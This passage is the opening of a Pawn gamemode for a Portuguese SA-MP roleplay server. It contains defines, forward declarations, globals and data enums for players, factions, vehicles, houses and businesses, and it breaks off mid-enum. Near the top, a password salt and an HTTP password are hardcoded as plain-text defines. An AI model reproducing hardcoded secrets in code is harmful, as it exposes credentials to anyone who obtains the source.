/*
 Este gamemode foi criado por bruxo (http://forum.sa-mp.com/member.php?u=181815)
 Vocé não tem o direito de remover os créditos deste gamemode. Respeite os direitos de autor.
 
-------------------------- DOENÇAS --------------------------

1: Gripe
2: Infeção Urinária
3: Dores de barriga
4: Ataques de tosse

-------------------------- CARROS --------------------------

-2 : Faction
-1 : Carro pessoal
0: Não configurado
> 0: Licenças / Job

mod1: Paintjobs
mod2: Exhausts
mod3: Front Bumpers
mod4: Rear Bumpers
mod5: Roofs
mod6: Spoilers
mod7: Side Skirts
mod8: Bullbars
mod9: Wheels
mod10: Nitro
mod11: Hidraulicos

-------------------------- EMPREGOS --------------------------

1: Autocarros X
2: Carteiro X
3: Lixeiros X
4: Transportador de Produtos X
5: Cimenteiro X
6: Limpa Ruas X
7: Lenhador X
8: Transportador de Gasolina X
9: Transportador de Dinheiro X

--------------------------------------------------------------

-->/vendar - mudar para preto
- /amarrar bugado
falta ligar para 112 medicos mecanicos
vida bugada -> meter no UpdateJogador para ver a vida

*/

#include 			<a_samp>
#include        	<mSelection>
#include        	<streamer>
#include 			<nex-ac>
#include			<DOF2>
#include        	<sscanf2>
#include 			<losgs>
#include        	<gmenus>
#include 			<zcmd>
#include            <crashdetect>
#include 			<YSI\y_iterate>
#include            <strlib>
#include            <socket>

#define     		HOSTNAME    			"Paradise City Roleplay v1.0 [PortugalFunMaps.pt]"
#define     		MAPNAME     			"Los Santos"
#define     		GAMEMODENAME    		"PC-RP 1.0.0"
#define     		WEBSITE         		"portugalfunmaps.pt"
#define     		LANGUAGE        		"Português"

#define             PW_SALT                 "asXedqA!sdRR:_1"
#define             HTTP_PASSWORD           "aslj33cxz_@asd"

#define         	LOG_MONEY           	"PCRP/Logs/Money.log"
#define         	LOG_JOIN            	"PCRP/Logs/Join.log"
#define         	LOG_HACK            	"PCRP/Logs/Hack.log"
#define             LOG_BAN                 "PCRP/Logs/Ban.log"
#define             LOG_KICK                "PCRP/Logs/Kick.log"
#define             LOG_INCOMING            "PCRP/Logs/Incoming.log"
#define             LOG_CMDS                "PCRP/Logs/Commands.log"
#define             LOG_ERROR       		"PCRP/Logs/Error.log"
#define             LOG_CHAT       			"PCRP/Logs/Chat.log"
#define             LOG_SOCKET       		"PCRP/Logs/Socket.log"

#define     		DIALOG_REGISTER     	1
#define     		DIALOG_LOGIN     		2
#define         	DIALOG_ORIGEM       	3
#define         	DIALOG_SEXO         	4
#define         	DIALOG_IDADE        	5
#define         	DIALOG_TUTORIAL1    	6
#define         	DIALOG_LOJA_MENU    	7
#define         	DIALOG_LOJA_INFO    	8
#define         	DIALOG_LOJA_ENTRADA 	9
#define         	DIALOG_LOJA_NOME   		10
#define         	DIALOG_LOJA_EXTRAIR 	11
#define         	DIALOG_CASA_MENU    	12
#define         	DIALOG_CASA_INFO    	13
#define         	DIALOG_CASA_ALUGUER 	14
#define         	DIALOG_CASA_ALPREC  	15
#define         	DIALOG_CASA_DEPOSITAR   16
#define             DIALOG_CASA_EXTRAIR     17
#define             DIALOG_FARMACIA         18
#define             DIALOG_CENTROEMPREGO    19
#define             DIALOG_TUTORIAL2        20
#define             DIALOG_TUTORIAL3        21
#define             DIALOG_TUTORIAL4        22
#define             DIALOG_TUTORIAL5        23
#define             DIALOG_QUESTIONARIO1    24
#define             DIALOG_QUESTIONARIO2    25
#define             DIALOG_QUESTIONARIO3    26
#define             DIALOG_QUESTIONARIO4    27
#define             DIALOG_QUESTIONARIO5    28
#define             DIALOG_QUESTIONARIO6    29
#define             DIALOG_QUESTIONARIO7    30
#define             DIALOG_QUESTIONARIO8    31
#define             DIALOG_ESTATISTICAS     32
#define             DIALOG_LICENCAS         33
#define             DIALOG_ATESTAR          34
#define             DIALOG_BANCO_MENU       35
#define             DIALOG_BANCO_DEPOSITAR  36
#define             DIALOG_BANCO_EXTRAIR    37
#define             DIALOG_BANCO_EXTRATO    38
#define             DIALOG_BANCO_TRANSF		39
#define             DIALOG_BANCO_TRANSF2    40
#define             DIALOG_PSP_MENU         41
#define             DIALOG_PSP_QUEIXA       42
#define             DIALOG_CODIGO	        43
#define             DIALOG_CODIGO1	        44
#define             DIALOG_CODIGO2	        45
#define             DIALOG_CODIGO3	        46
#define             DIALOG_CARTA_LIG	    47
#define             DIALOG_CARTA_PES	    48
#define             DIALOG_CARTA_MOTO	    49
#define             DIALOG_CM    			50
#define             DIALOG_LOJA_SEGURADORA  51
#define             DIALOG_LOJA_REST		52
#define             DIALOG_LOJA_BAR			53
#define             DIALOG_LOJA_247         54
#define             DIALOG_LOJA_TELE		55
#define             DIALOG_LOJA_STAND		56
#define             DIALOG_LOJA_CACA		57
#define             DIALOG_LOJA_ROUPA		58
#define             DIALOG_LOJA_FARM		59
#define             DIALOG_LOJA_APOSTA  	60
#define             DIALOG_LOJA_SEGUR   	61
#define             DIALOG_IMPOSTO_MENU   	62
#define             DIALOG_IMPOSTO_CARRO   	63
#define             DIALOG_IMPOSTO_CASA   	64
#define             DIALOG_IMPOSTO_LOJA   	65
#define             DIALOG_IMPOSTO_GERAL   	66
#define             DIALOG_TT				67
#define             DIALOG_BANCO_EXTRAIR_F  68
#define             DIALOG_BANCO_MENU_F     69
#define             DIALOG_BANCO_TEL   		70
#define             DIALOG_INFOLOJA   		71
#define             DIALOG_TUNNING          250

#define         	PRECO_COMIDA        	80
#define         	PRECO_COMIDA_PIZZA      50
#define         	PRECO_COMIDA_HAMB      	25
#define         	PRECO_COMIDA_BIFANAS    10
#define         	PRECO_COMIDA_TACO	    15
#define         	PRECO_COMIDA_SANDE    	5
#define         	PRECO_BEBIDA        	70
#define         	PRECO_BEBIDA_CERVEJA    15
#define         	PRECO_BEBIDA_TEQUILLA   35
#define         	PRECO_BEBIDA_VODKA     	25
#define         	PRECO_BEBIDA_WHISKEY    50
#define         	PRECO_BEBIDA_CHAMPAGNE  25
#define         	PRECO_BEBIDA_BAGACO     50
#define         	PRECO_BEBIDA_TINTO     	20
#define             PRECO_TELE         		750
#define         	PRECO_SKIN          	100
#define             PRECO_ACESSORIO         100
#define             PRECO_MEDICAMENTOS      100
#define             PRECO_DROGA             60
#define             PRECO_MATERIAIS         500
#define             PRECO_CODIGO            500
#define             PRECO_MOTAS             1000
#define             PRECO_LIGEIROS         	1500
#define             PRECO_PESADOS         	2500
#define             PRECO_BARCO         	5000
#define             PRECO_CC         		500
#define             PRECO_CONTSEGURADORA    500
#define             PRECO_SMS               5
#define             PRECO_CORVINA           15
#define             PRECO_CONGRO            12
#define             PRECO_ROBALO            20
#define             PRECO_SARGO             10
#define             PRECO_GORAZ             5
#define             PRECO_CAVALA            8
#define             PRECO_DOURADA           25
#define             PRECO_ESPADA            20
#define             PRECO_ISCO              2
#define             PRECO_TELEFONAR         15
#define             PRECO_LICPESCA          450
#define             PRECO_PRODUTOS          1

#define         	COLOR_WHITE         	0xFFFFFFAA
#define 			COLOR_ORANGE 			0xFF9900AA
#define 			COLOR_LIME 				0x99FF00AA
#define 			COLOR_RED 				0xAA3333AA
#define 			COLOR_LIGHTBLUE 		0x33CCFFAA
#define 			COLOR_YELLOW 			0xFFFF00AA
#define         	COLOR_CHAT          	0x00A6FFAA
#define         	COLOR_INFO          	0x52E3BAAA
#define         	COLOR_GM           		0xE8E541AA
#define         	COLOR_ADMIN         	0xE68D45AA
#define         	COLOR_HADMIN        	0x00FFFBAA
#define         	COLOR_OWNER	        	0x00FF00AA
#define         	COLOR_ERRO	        	0xFF0000AA 
#define         	COLOR_ACTION        	0xD65FE3AA
#define         	COLOR_CHATIC        	0xACB1C2AA
#define         	COLOR_BUSINESS      	0x0800FFAA
#define         	COLOR_OOC           	0xB4C2C1AA
#define         	COLOR_MECANICOS         0xB4C2C1AA
#define             COLOR_POLICIA           0x1B00FFAA
#define             COLOR_MEDICOS           0xFF00BBAA
#define             COLOR_NEWS              0x99CFFFAA
#define             COLOR_GOVERNO           0x377387AA

#define             BODY_PART_TORSO         3
#define             BODY_PART_CHEST         4
#define             BODY_PART_LEFT_ARM      5
#define             BODY_PART_RIGHT_ARM     6
#define             BODY_PART_LEFT_LEG      7
#define             BODY_PART_RIGHT_LEG     8
#define             BODY_PART_HEAD          9

#define             NEON_VERDE              1
#define             NEON_AMARELO            2
#define             NEON_BRANCO             3
#define             NEON_ROSA               4
#define             NEON_VERMELHO           5
#define             NEON_AZUL               6

#define         	MSG_NOADMIN         	"{FF4000}[ERRO:] {FFFFFF}Não tens permissão para usares esse comando"
#define         	MSG_NOTCONNECTED    	"{FF4000}[ERRO:] {FFFFFF}Esse jogador não está conectado"
#define         	MSG_NOCAR    			"{FF4000}[ERRO:] {FFFFFF}Não estás em nenhum carro"
#define         	MSG_NOMONEY         	"{FF4000}[ERRO:] {FFFFFF}Não tens dinheiro suficiente"

#define     		MAX_SLOTS               65
#define         	MAX_CARROS              300
#define         	MAX_CASAS           	150
#define         	MAX_CIDADES         	1
#define         	MAX_JOBS            	15
#define         	MAX_BUSINESS        	80
#define         	MAX_FACTIONS        	10
#define             MAX_BARREIRAS           30
#define             MAX_BUILDINGS           10

#define             SLOTSRESERVADOS         5

#define         	BTYPE_RESTAURANTE   	1
#define         	BTYPE_BAR           	2
#define         	BTYPE_247          		3
#define         	BTYPE_GASOLINA      	4
#define         	BTYPE_TELE          	5
#define         	BTYPE_STAND         	6
#define         	BTYPE_CACA          	7
#define         	BTYPE_ROUPA         	8
#define             BTYPE_FARMACIA          9
#define             BTYPE_APOSTAS           10
#define             BTYPE_SEGURADORA        11
#define             BTYPE_CENTROCOMERCIAL   12

#define             EUROMILHOES_SEGUNDO     1500
#define             EUROMILHOES_TERCEIRO    5000
#define             EUROMILHOES_QUARTO      10000
#define             EUROMILHOES_QUINTO      50000
#define             EUROMILHOES_SEXTO       500000
#define             EUROMILHOES_SETIMO      1500000

#define             F_POLICIA               1
#define             F_MEDICOS               2
#define             F_MECANICOS             3
#define             F_NEWS                  4
#define             F_GOVERNO               5
#define             F_DROGAS                6
#define             F_MAFIA                 7
#define             F_SR                    8

#define             BUILDING_POLICIA        1
#define             BUILDING_CAMARA         2
#define             BUILDING_NEWS           3
#define             BUILDING_HOSPITAL       4
#define             BUILDING_BANCO          5
#define             BUILDING_CONDUCAO       6
#define             BUILDING_CE         	7
#define             BUILDING_AEROPORTO      8
#define             BUILDING_CCOMERCIAL     9
#define             BUILDING_HOSPITAL2      10
#define             BUILDING_HOSPITAL3      11
#define             BUILDING_FABRICA      	12

#define             CHAT_TYPE_NORMAL        1
#define             CHAT_TYPE_BAIXO         2
#define             CHAT_TYPE_GRITAR        3
#define             CHAT_TYPE_SUSSURRAR     4

#pragma 			unused 					Numer
#pragma 			unused 					Number
#pragma 			unused 					Numbber

forward PlayerActionMessage(playerid,Float:radius,message[]);
forward PlayerPlayerActionMessage(playerid,targetid,Float:radius,message[]);
forward PlayerActionLog(string[]);
forward ProxDetectorRP(Float:radi, playerid, string1[]);
forward ProxDetectorChat(Float:radi, playerid, string1[], type);
forward ProxDetectorChatDuty(Float:radi, playerid, string1[]);
forward ProxDetectorS(Float:radi, playerid, targetid);
forward ProxDetector(Float:radi, playerid, string[]);
forward ProxDetectorDo(Float:radi, playerid, string1[]);

forward HttpDox(index, response_code, data[]);
forward HttpInfo(index, response_code, data[]);

forward Relogio();
forward OnCheatDetected(playerid, ip_address[], type, code);

forward RespawnGeral();
forward RespawnJobFac();
forward PlaySoundForAll(soundid);
forward UnlockTutorials(playerid);
forward NaoExplode();

forward ResetStats(playerid);
forward RegistarJogador(playerid, password[]);
forward LogarJogador(playerid, password[]);
forward GuardarJogador(playerid);
forward SpawnarJogador(playerid);
forward UpdateJogador(playerid);
forward CarregarPlayerTextDraws(playerid);
forward MenosDrunk(playerid);
forward Aviao(playerid);
forward WalkieTalkieMessage(playerid, msg[], freq);
forward HangupTimer(playerid);
forward UpdateMySQLInfo();
forward JogadorPuxaJogador(playerid, giveplayerid);

forward SetPlayerPosEx(playerid, Float:x, Float:y, Float:z);
forward SetVehiclePosEx(vehicleid, Float:x, Float:y, Float:z);
forward SetPlayerHealthEx(playerid, Float:vida, type);
forward SetPlayerArmourEx(playerid, Float:colete, type);

forward LigarMotor(playerid);
forward DesligarMotorTodos();
forward PayDay(playerid);
forward ShowStats(playerid, target, admincheck);
forward DrugEffect(playerid);
forward DesligarMotores();
forward AtualizarCaravanaPos(vehicleid);
forward AtualizarTodasCaravanasPos();
forward AtualizarDanosCarro(vehicleid);
forward Pescar(playerid);
forward Pescar2(playerid, peixeid);
forward PodePescar(playerid);

forward KickT(playerid);
forward BanT(playerid);
forward KickPlayer(playerid, kickedby[MAX_PLAYER_NAME], reason[]);
forward BanPlayer(playerid, kickedby[MAX_PLAYER_NAME], reason[]);
forward BanPlayerIP(playerid, kickedby[MAX_PLAYER_NAME], reason[]);

forward CarregarCidades();
forward GuardarCidades();
forward GuardarCidade(id);
forward CrashServer();

forward CarregarJobs();
forward GuardarJobs();
forward GuardarJob(id);
forward AcabarRota(playerid);
forward PausarRota(playerid, msg[], ms);
forward DespausarRota(playerid);
forward RotaMensagem(playerid, msg[]);

forward CarregarCarros();
forward GuardarCarros();
forward GuardarCarro(id);
forward AddVehicleComponentEx(vehicleid, componentid);
forward AtualizarTunning(vehicleid);

forward CarregarFactions();
forward GuardarFactions();
forward GuardarFaction(id);
forward RadioMessage(playerid, faction, msg[]);
forward RadioMessageGlobal(playerid, faction, msg[]);
forward RadioMessageOOC(playerid, faction, msg[]);

forward CarregarBizzes();
forward GuardarBizzes();
forward GuardarBizz(id);
forward AtualizarBiz(id);

forward CarregarBuildings();
forward GuardarBuildings();
forward GuardarBuilding(id);
forward AtualizarBuilding(id);

forward CarregarCasas();
forward GuardarCasas();
forward GuardarCasa(id);
forward AtualizarCasa(id);

forward CarregarServidor();
forward GuardarServidor();

forward CarregarStats();
forward GuardarStats();

forward CarregarOutros();
forward GuardarOutros();
forward CarregarMenus();

forward CarregarMapas();
forward CarregarMapasRemove(playerid);

forward AfterTutorial(playerid);
forward MatriculasAtualizar();

forward MoneyLog(playerid, howmuch);
forward JoinLog(playerid);
forward IncomingLog(playerid, ip[], port);
forward HackLog(playerid, str[]);
forward BanLog(playerid, kickedby[MAX_PLAYER_NAME], str[]);
forward KickLog(playerid, kickedby[MAX_PLAYER_NAME], str[]);
forward CMDLog(playerid, cmd[]);
forward ChatLog(playerid, msg[]);
forward ErrorLog(error[]);
forward SocketLog(msg[]);

forward VirarAmigo(playerid, giveplayerid);
forward Morte(playerid);

forward Intro1(playerid);
forward Intro2(playerid);
forward Intro3(playerid);
forward Intro4(playerid);
forward Intro5(playerid);
forward Intro6(playerid);
forward Intro7(playerid);
forward IntroEnd(playerid);

forward Velocimetro(playerid);
forward Euromilhoes();
forward Meteo(meteoid);

forward RestoreActor(actorid, worldid, Float:x, Float:y, Float:z);

new zonaPescar;

new Socket:g_Socket;

new currentSlots;

new Text:TDEditor_TD[7];
new Text:TDEditor_TDVel[14];
new PlayerText:TDEditor_PTD[MAX_SLOTS][6];
new Text:relogio;
new Text:TDEditor_TDInGame[5];

new bool: ATelefonar[MAX_SLOTS];
new ATelefonarPara[MAX_SLOTS];
new bool: AReceberChamada[MAX_SLOTS];
new AReceberChamadaDe[MAX_SLOTS];
new bool: AFalarTele[MAX_SLOTS];
new AFalarPara[MAX_SLOTS];
new bool: Emergencia[MAX_SLOTS];
new EmergenciaNum[MAX_SLOTS];

new UptimeSegundos;
new UptimeMinutos;
new UptimeHoras;
new UptimeDias;
new MeteoSegundos;
new MeteoMinutos;

new Tickbefore[MAX_SLOTS];
new Tickafter[MAX_SLOTS];
new TickCount;
new TickTotal;

new Tickbefore_Text[MAX_SLOTS];
new Tickafter_Text[MAX_SLOTS];
new TickCount_Text;
new TickTotal_Text;

new Tickbefore_Update[MAX_SLOTS];
new Tickafter_Update[MAX_SLOTS];
new TickCount_Update;
new TickTotal_Update;

new Tickbefore_Key[MAX_SLOTS];
new Tickafter_Key[MAX_SLOTS];
new TickCount_Key;
new TickTotal_Key;

new PingCount;
new PingTotal;

new Float: AntiAFK_X[MAX_SLOTS];
new Float: AntiAFK_Y[MAX_SLOTS];
new Float: AntiAFK_Z[MAX_SLOTS];
new AFKWarning[MAX_SLOTS];

new Float: STAND_X = 2474.4504;
new Float: STAND_Y = -1776.9380;
new Float: STAND_Z = 13.2972;
new Float: STAND_A = 89.3692;

new Float: STANDBARCO_X = 126.5508;
new Float: STANDBARCO_Y = -1911.7756;
new Float: STANDBARCO_Z = -0.5620;
new Float: STANDBARCO_A = 159.8367;

new Float: AJx = 180.9057;
new Float: AJy = -2752.6646;
new Float: AJz = 3.0545;

new ListaSkins;
new ListaAcessorios;
new ListaCarros;
new ListaCarrosComprar;
new ListaObjetos;
new ListaObjetosComprar;

new pspentrada1;
new pspentrada2;
new bool: pspentrada1_b = false;
new bool: pspentrada2_b = false;

new pspgaragem1;
new pspgaragem2;
new bool: pspgaragem1_b = false;
new bool: pspgaragem2_b = false;

new srgaragem1_1;
new srgaragem1_2;
new srgaragem2_1;
new srgaragem2_2;
new bool: srgaragem1_1_b = false;
new bool: srgaragem1_2_b = false;
new bool: srgaragem2_1_b = false;
new bool: srgaragem2_2_b = false;

new MenuArmas;

new BadLoginCounter[MAX_SLOTS];
new AntiSpamAC[MAX_SLOTS];
new DrugEffectCounter[MAX_SLOTS];
new DrunkLevel[MAX_SLOTS];
new SpeedWarning[MAX_SLOTS];

new bool: OOCStatus = false;
new bool: AdminDuty[MAX_SLOTS];
new bool: Logged[MAX_SLOTS];
new bool: UnlockTutorial[MAX_SLOTS];
new bool: PMStatus[MAX_SLOTS];
new bool: DebugStatus[MAX_SLOTS];
new bool: DebugStatusAdv[MAX_SLOTS];
new bool: DebugStatusKey[MAX_SLOTS];
new bool: ATirarCartaLigeiro[MAX_SLOTS];
new bool: ATirarCartaPesados[MAX_SLOTS];
new bool: ATirarCartaMota[MAX_SLOTS];
new bool: ATirarCartaBarco[MAX_SLOTS];
//new bool: IsInGaragemPSP[MAX_SLOTS];
new bool: Vendado[MAX_SLOTS];
new bool: Amarrado[MAX_SLOTS];
new bool: IsARespawn[MAX_CARROS];
new bool: PodePescarB[MAX_SLOTS];

new RespawnCounter;
new RespawnCounterJob;
new TimerRespawn;
new TimerRespawnJobFac;

new EuroNumber[5];
new EuroStar[2];

new HoraAntiga = -1;

new PuxadorID[MAX_SLOTS];

new bool: FirstSpawn[MAX_SLOTS];

new bool: Algemado[MAX_SLOTS];
new bool: Multado[MAX_SLOTS];
new CustoMulta[MAX_SLOTS];
new MultadorID[MAX_SLOTS];
new Barreiras[MAX_BARREIRAS];
new BarreirasCounter;

new bool: Reparacao[MAX_SLOTS];
new PrecoReparacao[MAX_SLOTS];
new ReparadorID[MAX_SLOTS];
new bool: Pintura[MAX_SLOTS];
new PrecoPintura[MAX_SLOTS];
new PintorID[MAX_SLOTS];
new Cor1[MAX_SLOTS];
new Cor2[MAX_SLOTS];
new bool: Atestar[MAX_SLOTS];
new PrecoAtestar[MAX_SLOTS];
new AtestadorID[MAX_SLOTS];
new bool: Revisao[MAX_SLOTS];
new PrecoRevisao[MAX_SLOTS];
new RevisorID[MAX_SLOTS];
new bool: ConviteFac[MAX_SLOTS];
new ConvidadorFac[MAX_SLOTS];

new bool: Receita[MAX_SLOTS];
new PrecoReceita[MAX_SLOTS];
new ReceitadorID[MAX_SLOTS];
new Medicamento[MAX_SLOTS];
new bool: Consulta[MAX_SLOTS];
new PrecoConsulta[MAX_SLOTS];
new ConsultadorID[MAX_SLOTS];
new bool: Desentoxicar[MAX_SLOTS];
new PrecoDesentoxicar[MAX_SLOTS];
new DesentoxicadorID[MAX_SLOTS];

new bool: Entrevista[MAX_SLOTS];
new EntrevistadorID[MAX_SLOTS];
new bool: ASerEntrevistado[MAX_SLOTS];
new bool: AEntrevistar[MAX_SLOTS];

new TransferirPara[MAX_SLOTS];
new CanaDePescaObjeto[MAX_SLOTS];

enum PlayerInfo
{
	Key[256],
	Banido,
	UID,
	Float:Vida,
	Level,
	Skin,
	Admin,
	Emprego,
	Faction,
	FactionRank,
	AJCounter,
	RegDay[8],
	Origem,
	Sexo,
	Idade,
	Registado,
	TutFeito,
	Money,
	Bank,
	ChaveBiz,
	ChaveCasa,
	ChaveCasaAlugada,
	ChaveCarro1,
	ChaveCarro2,
	ChaveCarro3,
	ChaveCarro4,
	ChaveCarroEmp1,
	ChaveCarroEmp2,
	ChaveCarroEmp3,
	ChaveCarroEmp4,
	Minutos,
	PreDrogas,
	PreMateriais,
	Drogas,
	Materiais,
	CartaLig,
	CartaMota,
	CartaPesados,
	CartaBarco,
	LicArmas,
	Multas,
	Jailed,
	JailTime,
	Preso,
	PresoTempo,
	XP,
	Meses,
	Doenca,
	Medicamentos,
	MedicamentosTomados,
	ReceitaMedica,
	Morto,
	Float:MorteX,
	Float:MorteY,
	Float:MorteZ,
	MorteVirtualWorld,
	MorteInterior,
	Euro1,
	Euro2,
	Euro3,
	Euro4,
	Euro5,
	BilheteEuro,
	Estrela1,
	Estrela2,
	Codigo,
	Rotas,
	EmpregoNivel,
	TempoRota,
	CC,
	Seguradora,
	MensalidadeSeguradora,
	SeguradoraCount,
	SeguradoraPayCount,
	Golds,
	Viciado,
	TempoViciado,
	ADesentoxicar,
	NumeroTelemovel,
	Rede,
	Saldo,
	TutFalhado,
	LicPesca,
	Float:Colete,
	Float:SpawnX,
	Float:SpawnY,
	Float:SpawnZ,
	SpawnVirtualWorld,
	SpawnInterior,
	Suspeito,
	VezesSuspeito,
	VezesPreso,
};
new pInfo[MAX_SLOTS][PlayerInfo];
new TimerGuardarJogador[MAX_SLOTS] = -1;
new TimerDrunk[MAX_SLOTS];
new TimerDroga[MAX_SLOTS];
new TimerUpdateJogador[MAX_SLOTS];
new TimerUnlockTutorial[MAX_SLOTS];
new TimerPuxarJogador[MAX_SLOTS];
new TimerVelocimetro[MAX_SLOTS];
new CounterVelocimetro[MAX_SLOTS];
new CounterKilometros[MAX_SLOTS];
new Segundos[MAX_SLOTS];
new Text3D: DutyLabel[MAX_SLOTS];
new Text3D: UIDLabel[MAX_SLOTS];
new bool: Cinto[MAX_SLOTS];

new Number [] = { 1,2,3,4,5,6,7,8,9 };

new Numer [] = {
1,2,3,4,5,6,7,8,9,10,
11,12,13,14,15,16,17,18,19,20,
21,22,23,24,25,26,27,28,29,30,
31,32,33,34,35,36,37,38,39,40,
41,42,43,44,45,46,47,48,49,50
};

new Numbber [] = {
1,2,3,4,5,6,7,8,9,10,
11,12,13,14,15,16,17,18,19,20,
21,22,23,24,25,26,27,28,29,30,
31,32,33,34,35,36,37,38,39,40,
41,42,43,44,45,46,47,48,49,50,
51,52,53,54,55,56,57,58,59,60,
61,62,63,64,65,66,67,68,69,70,
71,72,73,74,75,76,77,78,79,80,
81,82,83,84,85,86,87,88,89,90,
91,92,93,94,95,96,97,98,99,100,
};

enum PlayerObjects
{
	Mala,
	Mochila,
	Arma1Mala,
	Ammo1Mala,
	Arma2Mala,
	Ammo2Mala,
	Arma3Mala,
	Ammo3Mala,
	Arma4Mala,
	Ammo4Mala,
	Telemovel,
    o_2054,
    o_18639,
    o_18943,
    o_2053,
    o_2052,
    o_19160,
    o_18940,
    o_18941,
    o_19006,
    o_19027,
    o_18939,
    o_19007,
    o_19008,
    o_19009,
    o_19010,
    o_19011,
    o_19012,
    o_19013,
    o_19014,
    o_19015,
    o_19016,
    o_19017,
    o_19018,
    Radio,
    Arma1Mochila,
    Ammo1Mochila,
    Arma2Mochila,
    Ammo2Mochila,
    Arma3Mochila,
    Ammo3Mochila,
    Arma4Mochila,
    Ammo4Mochila,
    Bidom,
	ListaTel,
	Mascara,
	Corda,
	Venda,
	Capacete,
	CanaDePesca,
	WalkieTalkie,
	WalkieTalkieFreq,
	Peixe_Corvina,
	Peixe_Congro,
	Peixe_Robalo,
	Peixe_Sargo,
	Peixe_Goraz,
	Peixe_Cavala,
	Peixe_Dourada,
	Peixe_Espada,
	Isco,
};
new pObjects[MAX_SLOTS][PlayerObjects];
new bool: AUsarMala[MAX_SLOTS];
new bool: AUsarMochila[MAX_SLOTS];
new bool: AUsarChapeu[MAX_SLOTS];
new bool: AUsarOculos[MAX_SLOTS];

enum FactionInfo
{
	Nome[32],
	Type,
	Legal,
	Bank,
	Float:X,
	Float:Y,
	Float:Z,
	Float:A,
	Rank1[32],
	Rank2[32],
	Rank3[32],
	Rank4[32],
	Rank5[32],
	Rank6[32],
	SalarioRank1,
	SalarioRank2,
	SalarioRank3,
	SalarioRank4,
	SalarioRank5,
	SalarioRank6,
	SkinRank1,
	SkinRank2,
	SkinRank3,
	SkinRank4,
	SkinRank5,
	SkinRank6,
	JoinRank,
	Color[32],
	UseDuty,
	Float:DutyX,
	Float:DutyY,
	Float:DutyZ,
	DutyVirtualWorld,
	DutyInterior,
};
new fInfo[MAX_FACTIONS][FactionInfo];
new bool: FactionDuty[MAX_SLOTS];

enum sInfo
{
	Nome[16],
	Float:X,
	Float:Y,
	Float:Z,
	Float:A,
	Interior,
	VirtualWorld,
};
new SpawnInfo[MAX_CIDADES][sInfo];

enum jobInfo
{
	ID,
	Nome[32],
	Salario,
	RotaSalario,
	Ligeiros,
	Pesados,
	Motociclos,
	Barco,
};
new jInfo[MAX_JOBS][jobInfo];
new RotaJob1[MAX_SLOTS]; // 
new RotaJob2[MAX_SLOTS]; //
new RotaJob3[MAX_SLOTS]; // 
new RotaJob4[MAX_SLOTS]; // 
new RotaJob5[MAX_SLOTS]; // 
new RotaJob6[MAX_SLOTS]; //
new RotaJob7[MAX_SLOTS]; // 
new RotaJob8[MAX_SLOTS]; // 
new RotaJob9[MAX_SLOTS]; // 
/*new RotaJob10[MAX_SLOTS];
new RotaJob11[MAX_SLOTS];
new RotaJob12[MAX_SLOTS];
new RotaJob13[MAX_SLOTS]; */

new RotaConducao[MAX_SLOTS];

enum CarInfo
{
	ID,
	Model,
	Float:X,
	Float:Y,
	Float:Z,
	Float:Angle,
	Color1,
	Color2,
	Faction,
	Type,
	Comprado,
	Travao,
	Kilometros,
	Metros,
	Neon,
	NeonStatus,
	Gasolina,
	Trancado,
	Float:Vida,
	mod1,
	mod2,
	mod3,
	mod4,
	mod5,
	mod6,
	mod7,
	mod8,
	mod9,
	mod10,
	mod11,
	Apreendido,
	Arma1,
	Ammo1,
	Arma2,
	Ammo2,
	Arma3,
	Ammo3,
	Prop[32],
	Matricula[9],
	CompradoEm[24],
	RadioStatus,
	IsCaravana,
	CaravanaCasaID,
	VirtualWorld,
	Interior,
	Panels,
	Doors,
	Lights,
	Tires,
};
new cInfo[MAX_CARROS][CarInfo];
new Text3D:Matricula3DText[MAX_CARROS];
new bool: Motor[MAX_CARROS];
new neon[MAX_CARROS][2];
new bool: NeonLigado[MAX_CARROS];
new Sirene[MAX_CARROS];
new Sirene_O[MAX_CARROS];

enum BuildingInfo
{
	ID,
	Nome[32],
	Float:EnterX,
	Float:EnterY,
	Float:EnterZ,
	Float:EnterAngle,
	EnterInterior,
	EnterVirtualWorld,
	Float:ExitX,
	Float:ExitY,
	Float:ExitZ,
	Float:ExitAngle,
	Interior,
	VirtualWorld,
	PickupID,
	Locked,
};
new buInfo[MAX_BUILDINGS][BuildingInfo];
new Text3D:BuildingLabel[MAX_BUILDINGS];
new BuildingPickup[MAX_BUILDINGS];

enum HouseInfo
{
	ID,
	Nome[32],
	Owner[32],
	Comprada,
	Float:EnterX,
	Float:EnterY,
	Float:EnterZ,
	Float:EnterAngle,
	EnterInterior,
	EnterVirtualWorld,
	Float:ExitX,
	Float:ExitY,
	Float:ExitZ,
	Float:ExitAngle,
	Interior,
	VirtualWorld,
	PickupID,
	Locked,
	Price,
	Bank,
	AluguerStatus,
	Aluguer,
	Arma1,
	Ammo1,
	Arma2,
	Ammo2,
	Arma3,
	Ammo3,
	IsCaravana,
	CarroCaravanaID,
	Float:GaragemEnterX,
	Float:GaragemEnterY,
	Float:GaragemEnterZ,
	GaragemEnterInterior,
	GaragemEnterVirtualWorld,
	Float:GaragemExitX,
	Float:GaragemExitY,
	Float:GaragemExitZ,
	Float:GaragemExitAngle,
	GaragemVirtualWorld,
	GaragemPickupID,
	GaragemLocked,
};
new hInfo[MAX_CASAS][HouseInfo];
new Text3D:HouseLabel[MAX_CASAS]; 
new HousePickup[MAX_CASAS];
new Text3D:GaragemLabel[MAX_CASAS];
new GaragemPickup[MAX_CASAS];

enum BizInfo
{
	ID,
	Nome[32],
	Owner[32],
	Type,
	Float:EnterX,
	Float:EnterY,
	Float:EnterZ,
	Float:EnterAngle,
	EnterInterior,
	EnterVirtualWorld,
	Interior,
	VirtualWorld,
	Comprada,
	Price,
	Locked,
	Produtos,
	Bank,
	PickupID,
	Entrada,
	Float:ExitX,
	Float:ExitY,
	Float:ExitZ,
	Float:ExitAngle,
	Seguradora,
	Float:ActorX,
	Float:ActorY,
	Float:ActorZ,
	Float:ActorAngle,
	ActorModel,
};
new bInfo[MAX_BUSINESS][BizInfo];
new Text3D:BizLabel[MAX_BUSINESS];
new BizPickup[MAX_BUSINESS];
new BizActor[MAX_BUSINESS];
new Text3D:ActorLabel[MAX_BUSINESS];
new bool:ActorFirstTime[MAX_BUSINESS];

enum ServerStats
{
	JoinCount,
	MinutesPlayed,
	Ajudas,
	Comandos,
	AJs,
	Kicks,
	Bans,
	Rotas,
	VIPs,
	CarrosComprados,
	PMs,
};
new sStats[1][ServerStats];

enum OutroInfo
{
	RegistoCounter,
	Float:LicX,
	Float:LicY,
	Float:LicZ,
	LicPickupID,
	LicVirtualWorld,
	LicInterior,
	Float:EmpregoX,
	Float:EmpregoY,
	Float:EmpregoZ,
	EmpregoPickupID,
	EmpregoVirtualWorld,
	EmpregoInterior,
